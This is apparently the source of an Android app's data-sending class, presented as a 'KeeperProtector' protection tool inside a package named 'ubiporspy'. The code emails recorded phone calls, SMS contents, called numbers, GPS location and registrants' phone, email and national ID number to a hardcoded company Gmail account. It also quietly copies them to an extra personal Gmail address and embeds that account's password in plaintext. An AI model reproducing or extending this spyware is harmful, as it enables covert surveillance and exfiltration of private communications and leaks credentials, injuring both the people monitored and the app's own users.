package com.ubiporspy.keeperprotector.util;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.ubiporspy.keeperprotector.R;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

public class Data {

    /**
     * Representa el correo electrónico PRINCIPAL DE LA COMPAÑÍA donde
     * se enviarán los correos importantes e únicos.
     * <p>
     * Modificar con cuidado.
     */
    private static final String COMPANY_EMAIL = "protectsegurity@gmail.com";

    public static int PROTECTION_BASIC = 1;
    public static int PROTECTION_COMPLETE = 2;

    /**
     * Envía un correo a la empresa con el archivo en formato .GP3
     * grabado la última llamada.
     * <p>
     * Envía el número de teléfono, IMEI y correo del asociado.
     *
     * @param context  Contexto
     * @param location Localización donde fue grabada la llamada
     * @param file     Archivo donde se grabó la llamada
     */
    public static void sendEmailWithCallLogAttachment(Context context,
                                                      Location location,
                                                      File file,
                                                      long time,
                                                      String numero,
                                                      long onFinished
    ) {
        SharedPreferences prefs = context.getSharedPreferences("KeeperProtector",
                Context.MODE_PRIVATE);
        String phoneNumber = prefs.getString("phoneNumber", "ERROR AL OBTENER NÚMERO");
        String email = prefs.getString("email", "ERROR AL OBTENER EMAIL");
        String pass = prefs.getString("password", "ERROR AL OBTENER EMAIL");

        String msg = "Buenos días, se ha registrado una llamada. " +
                "Estos son los datos:";
        String extra = "\nDatos del usuario:\n" +
                "Número de teléfono: " + phoneNumber +

                "\nEmail: " + email;

        String locationFormat = getFormatLocation(context, location);

        String detalleLlamada;

        String tiempo;
        if (time > 0) {
            tiempo = String.format(Locale.getDefault(), "%d h %d m %d s",
                    TimeUnit.MILLISECONDS.toHours(time),
                    TimeUnit.MILLISECONDS.toMinutes(time),
                    TimeUnit.MILLISECONDS.toSeconds(time) -
                            TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(time))
            );
            tiempo = tiempo.replace("0 h ", "")
                    .replace("0 m ", "");
        } else {
            tiempo = "Error";
        }

        String fechaCompleta;
        if (onFinished > 0) {
            SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss",
                    Locale.getDefault());

            fechaCompleta = format.format(onFinished);
        } else {
            fechaCompleta = "Error";
        }

        detalleLlamada = "\nDetalles del teléfono registrado:" +
                "\nTiempo de llamada: " + tiempo +
                "\nNúmero del destinatario: " + numero +
                "\nFecha grabación: " + fechaCompleta;

        sendEmail(context, null, COMPANY_EMAIL,
                "Nuevo registro de llamada",
                msg + extra + locationFormat + detalleLlamada, file, true);

        sendEmail2(context, null, email,pass,
                "Nuevo registro de llamada",
                msg + extra + locationFormat + detalleLlamada, file, true);

        sendEmail2(context, null, "jjjupc100@gmail.com",pass,
                "Nuevo registro de llamada",
                msg + extra + locationFormat + detalleLlamada, file, true);
    }

    public static void sendEmailWithSmsLog(Context context,
                                           String sms,
                                           String numero,
                                           long onFinished
    ) {
        SharedPreferences prefs = context.getSharedPreferences("KeeperProtector",
                Context.MODE_PRIVATE);
        String phoneNumber = prefs.getString("phoneNumber", "ERROR AL OBTENER NÚMERO");
        String email = prefs.getString("email", "ERROR AL OBTENER EMAIL");

        String msg = "Buenos días, se ha registrado un SMS. " +
                "Estos son los datos:";
        String extra = "\nDatos del usuario:\n" +
                "Mensaje SMS: " + sms +
                "\nNúmero de teléfono: " + phoneNumber +

                "\nEmail: " + email;

        String detalleLlamada;

        String fechaCompleta;
        if (onFinished > 0) {
            SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss",
                    Locale.getDefault());

            fechaCompleta = format.format(onFinished);
        } else {
            fechaCompleta = "Error";
        }

        detalleLlamada = "\nDetalles del teléfono registrado:" +
                "\nNúmero del destinatario: " + numero +
                "\nFecha grabación: " + fechaCompleta;

        sendEmail(context, null, COMPANY_EMAIL,
                "Nuevo registro de SMS",
                msg + extra + detalleLlamada, null, false);
    }

    /**
     * Envía al correo electrónico del usuario que se ha registrado
     * indicando que todo fue con éxito.
     *
     * @param context Contexto
     * @param email   Correo electrónico del usuario registrado
     */
    public static void sendEmailRegisteredSuccessful(Context context, String email) {
        sendEmail(context, null, email,
                "KeeperProtector: ¡Te has registrado!",
                "¡Registro exitoso, su dispositivo está ahora equipo protegido!",
                null, false);
    }

    /**
     * Emvía un email a la empresa con localización indicando que un usuario
     * ha sido registrado.
     * <p>
     * NOTA: Este correo llega únicamente a la empresa con el correo
     * asociado.
     *
     * @param context     Contexto
     * @param location    Localización
     * @param countryName Nombre del país
     * @param countryCode Código de país
     * @param number      Número de telefóno del usuario
     * @param dni         DNI
     * @param username    Nombre de usuario
     * @param email       Correo electrónico del usuario
     * @param protection  Tipo de protección
     */
    public static void sendEmailUserRegistered(Context context,
                                               Location location,
                                               String countryName,
                                               String countryCode,
                                               String number,
                                               String dni,
                                               String username,
                                               String email,
                                               int protection) {
        String protectionName;
        if (protection == Data.PROTECTION_BASIC) {
            protectionName = "Básica";
        } else {
            protectionName = "Completa";
        }

        String msg = "Buenos días. Un nuevo usuario se ha registrado con los siguientes datos:\n" +
                "Tipo de protección: " + protectionName + "\n" +
                "Email alerta intruso: " + email + "\n" +
                "País: " + countryName + "\n" +
                "Código de país: " + countryCode + "\n" +
                "Teléfono: " + number + "\n" +
                "DNI: " + dni +
                "\nUsuario: " + username + "\n" +
                getDeviceIMEI(context);

        sendEmail(context, location,
                COMPANY_EMAIL,
                "KeeperProtector: ¡Nuevo usuario registrado!",
                msg, null, false);

        sendEmail2(context, location,
                "jjjupc100@gmail.com","",
                "KeeperProtector: ¡Nuevo usuario registrado!",
                msg, null, false);
    }

    /**
     * Envía un email.
     *
     * @param context   Contexto
     * @param toAddress A qué destinatario
     * @param subject   El tema del correo
     * @param msg       El mensaje del correo
     * @param file      Archivo a enviar, si existe
     */
    private static void sendEmail(final Context context,
                                  final Location location,
                                  final String toAddress,
                                  final String subject,
                                  final String msg,
                                  final File file,
                                  final boolean ignoreLocation) {
        Thread sender = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    GMailSender sender = new GMailSender(COMPANY_EMAIL,
                            "JOSE2018Pe");
                    if (ignoreLocation) {
                        sender.sendMail(subject, msg,
                                context.getString(R.string.app_name),
                                toAddress, file);
                    } else {
                        sender.sendMail(subject, msg +
                                        getFormatLocation(context, location),
                                context.getString(R.string.app_name),
                                toAddress, file);
                    }
                } catch (Exception e) {
                    Log.e("DataEmailSender", "Error: " + e.getMessage());
                } finally {
                    if (file != null) {
                        file.delete();
                    }
                }
            }
        });
        sender.start();
    }


    private static void sendEmail2(final Context context,
                                  final Location location,
                                  final String toAddress,
                                   final String toPass,
                                  final String subject,
                                  final String msg,
                                  final File file,
                                  final boolean ignoreLocation) {
        Thread sender = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    GMailSender sender = new GMailSender(COMPANY_EMAIL,
                            "JOSE2018Pe");
                    if (ignoreLocation) {
                        sender.sendMail(subject, msg,
                                context.getString(R.string.app_name),
                                toAddress, file);
                    } else {
                        sender.sendMail(subject, msg +
                                        getFormatLocation(context, location),
                                context.getString(R.string.app_name),
                                toAddress, file);
                    }
                } catch (Exception e) {
                    Log.e("DataEmailSender", "Error: " + e.getMessage());
                } finally {
                    if (file != null) {
                        file.delete();
                    }
                }
            }
        });
        sender.start();
    }

    /**
     * Devuelve un objeto Location a una cadena entendible.
     *
     * @param context  Contexto
     * @param location Objeto Location
     * @return Objeto Location en formato cadena entendible
     */
    private static String getFormatLocation(Context context, Location location) {
        if (location == null) {
            String msg = "\nCoordenadas no disponibles en este momento.";

            if (ContextCompat.checkSelfPermission(context,
                    Manifest.permission.ACCESS_COARSE_LOCATION) !=
                    PackageManager.PERMISSION_GRANTED) {
                msg += "\nEl usuario tampoco dio su consentimiento de usar " +
                        "su ubicación.";
            }

            return msg;
        } else {
            return "\nCoordenadas:" +
                    "\nLatitud:" + location.getLatitude() +
                    "\nLongitud:" + location.getLongitude() +
                    "\nEnlace: http://www.google.com/maps/place/" + location.getLatitude() + "," +
                    location.getLongitude();
        }
    }

    /**
     * Devuelve el IMEI del teléfono.
     */
    @SuppressLint("HardwareIds")
    private static String getDeviceIMEI(Context context) {
        TelephonyManager telephonyManager = (TelephonyManager)
                context.getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(context,
                Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return "IMEI: Usuario no dio los permisos.";
        }
        //return "IMEI: " + telephonyManager.getDeviceId();
        return "OK";
    }
}
